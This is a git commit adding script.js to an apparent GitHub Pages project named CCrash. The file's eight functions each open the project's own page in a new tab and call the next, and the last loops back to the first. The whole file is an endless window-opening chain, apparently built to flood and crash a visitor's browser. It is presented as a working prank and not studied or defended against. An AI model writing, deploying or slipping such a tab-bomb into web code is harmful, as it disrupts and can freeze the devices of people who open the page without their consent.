0331848f4e6de61d6fd3262953408407240b4d25
Emangod <78701460+eman225511@users.noreply.github.com>
2024-11-24 17:31:54 -0500

    Add files via upload

---
+++ script.js
@@ -0,0 +1,39 @@
+function open1() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open2()
+}
+
+function open2() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open3()
+}
+
+function open3() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open4()
+}
+
+function open4() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open5()
+}
+
+function open5() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open6()
+}
+
+function open6() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open7()
+}
+
+function open7() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open8()
+}
+
+function open8() {
+  window.open("https://eman225511.github.io/CCrash/", "_blank");
+  open1()
+}
